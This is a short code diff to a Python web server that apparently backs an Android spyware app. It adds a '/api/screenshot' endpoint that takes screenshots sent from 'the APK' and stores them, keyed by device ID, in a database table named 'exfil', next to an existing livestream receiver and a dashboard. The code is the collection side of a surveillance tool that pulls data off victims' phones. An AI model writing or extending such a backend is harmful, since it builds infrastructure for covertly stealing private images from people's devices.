@@ -76,6 +76,23 @@ async def receive_livestream(request: Request):
 # Dashboard REST API
 # ─────────────────────────────────────────────────────────────
 
+@app.post("/api/screenshot")
+async def receive_screenshot(request: Request):
+    """Receive screenshot data from the APK."""
+    try:
+        data = await request.json()
+        device_id = data.get("device_id", "unknown")
+        image_data = data.get("image", "")
+        import database
+        conn = database.get_db()
+        c = conn.cursor()
+        c.execute("INSERT INTO exfil (device_id, data_type, payload) VALUES (?, ?, ?)",
+                  (device_id, "screenshot", image_data))
+        conn.commit()
+        conn.close()
+        return {"status": "ok"}
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
 @app.get("/api/stats")
 async def stats():
     return get_stats()
